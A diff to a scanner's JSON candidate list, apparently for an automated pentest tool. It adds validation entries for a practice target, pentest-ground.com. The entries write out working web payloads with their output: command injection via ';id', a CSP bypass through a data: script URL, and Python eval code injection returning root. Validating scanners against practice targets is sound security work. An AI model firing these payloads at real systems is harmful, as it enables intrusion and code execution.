@@ -1,6 +1,24 @@
 {
   "candidates": [
     {
+      "source": "discovery:pentest-ground.com",
+      "slug": "pentest-ground-dvwa-exec-cmdi-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://pentest-ground.com:4280/vulnerabilities/exec/ ip=127.0.0.1;id returns uid=33(www-data); pentest-ground.com:4280/vulnerabilities/exec findings 7→8; benchmark juice-shop-staging 13 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:pentest-ground.com",
+      "slug": "pentest-ground-dvwa-csp-bypass-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://pentest-ground.com:4280/vulnerabilities/csp/ include=data:text/javascript,alert(1) reflects <script src='data:text/javascript,alert(1)'>; pentest-ground.com:4280/vulnerabilities/csp findings 7→8; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:pentest-ground.com",
+      "slug": "pentest-ground-restflaw-eval-code-injection-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET https://pentest-ground.com:9000/eval?s=__import__('os').popen('id').read() with X-Auth-Token: THISISATOKEN returns uid=0(root); pentest-ground.com:9000/api/users findings 2→3; benchmark 6/6 maintained"
+    },
+    {
       "source": "discovery:urban-vampi-production.up.railway.app",
       "slug": "vampi-user-bola-live-oracle",
       "status": "shipped",
